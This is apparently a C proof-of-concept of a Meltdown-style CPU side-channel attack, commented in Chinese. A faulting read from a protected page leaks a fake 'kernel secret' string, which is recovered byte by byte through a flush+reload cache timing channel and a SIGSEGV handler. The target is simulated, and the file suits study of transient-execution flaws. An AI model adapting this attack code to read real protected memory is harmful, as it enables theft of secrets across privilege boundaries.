#define _GNU_SOURCE

#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <sys/ucontext.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>
#include <sched.h>
#include <x86intrin.h>
#include <sys/mman.h>
#include "../utils/cache_instr.h"

#define GAP 4096
uint8_t channel[256 * GAP];
int cache_hit_threshold = 400;

/* 用户态缓冲区，用于存储最终“恢复”数据 */
static unsigned char secret_buf[256] __attribute__((aligned(4096)));

/* 模拟的受控“内核数据”区域 */
static unsigned char *fake_kernel;
static size_t page_size;

/* Flush channel */
void flush_cache()
{
    for (int i = 0; i < 256; i++)
    {
        flush(&channel[i * GAP]);
    }
}

extern char stopspeculate[];

static void __attribute__((noinline)) victim(unsigned long secret_addr)
{
    __asm__ volatile(
        "1:\n\t"
        /* 扩大瞬态窗口 */
        ".rept 300\n\t"
        "add $0x141, %%rax\n\t"
        ".endr\n\t"

        /* 这条对不可访问地址的读取会触发 SIGSEGV */
        "mov (%[kaddr]), %%rax\n\t"

        /* 瞬态执行期间访问 secret 并编码到缓存 */
        "movzbl (%[saddr]), %%eax\n\t"
        "shl $12, %%rax\n\t"
        "movb (%[target], %%rax, 1), %%al\n\t"

        ".globl stopspeculate\n\t"
        "stopspeculate:\n\t"
        "nop\n\t"
        :
        : [target] "r"(channel),
          [saddr]  "r"(secret_addr),
          [kaddr]  "r"(secret_addr)  // 访问模拟内核 secret
        : "rax", "cc", "memory");
}

static int results[256];
void cache_detect()
{
    int i, mix_i;
    register uint64_t time1, time2;
    volatile uint8_t *addr;
    for (int i = 0; i < 256; i++)
    {
        mix_i = ((i * 167) + 13) & 255;
        addr = &channel[mix_i * GAP];

        time1 = rdtscp();
        maccess(addr);
        time2 = rdtscp();

        if ((int)(time2-time1) <= cache_hit_threshold)
            results[mix_i]++;
    }
}

void sigsegv(int sig, siginfo_t *siginfo, void *context)
{
    ucontext_t *ucontext = context;
    ucontext->uc_mcontext.gregs[REG_RIP] = (unsigned long)stopspeculate;
    return;
}

int set_signal(void)
{
    struct sigaction act = {
        .sa_sigaction = sigsegv,
        .sa_flags = SA_SIGINFO,
    };

    return sigaction(SIGSEGV, &act, NULL);
}

int ReadOneByte(unsigned long addr)
{
    int i, ret = 0, max = -1, maxi = -1;

    memset(results, 0, sizeof(results));

    for (i = 0; i < 1000; i++)
    {
        flush_cache();
        mfence();

        victim(addr);

        mfence();
        cache_detect();
    }

    for (i = 0; i < 256; i++)
    {
        if (results[i] && results[i] > max)
        {
            max = results[i];
            maxi = i;
        }
    }
    return maxi;
}

int main(int argc, char *argv[])
{
    int i;
    unsigned long addr;
    size_t size;

    memset(channel, 1, sizeof(channel));

    if (set_signal() != 0) { perror("set_signal"); return 1; }

    /* 创建受控模拟“内核数据”区域 */
    page_size = 4096;
    fake_kernel = mmap(NULL, page_size, PROT_NONE,
                       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (fake_kernel == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    /* 写入模拟秘密，先临时设置可写 */
    mprotect(fake_kernel, page_size, PROT_READ | PROT_WRITE);
    const char *msg = "FAKE_KERNEL_SECRET: CPU Test 123!\n";
    memcpy(fake_kernel, msg, strlen(msg));
    mprotect(fake_kernel, page_size, PROT_NONE); // 恢复不可访问
    mfence();
    addr = (unsigned long)fake_kernel;
    size = strlen(msg);
    printf("Using simulated kernel secret at 0x%lx (%lu bytes)\n", addr, size);

    for (i = 0; i < (int)size; i++)
    {
        int byte = ReadOneByte(addr);
        if (byte == -1) byte = 0xff;
        printf("read %lx = %02x %c (score=%d/%d)\n",
               addr, byte, isprint(byte) ? byte : ' ',
               byte != 0xff ? results[byte] : 0,
               1000);
        addr++;
    }

    return 0;
}
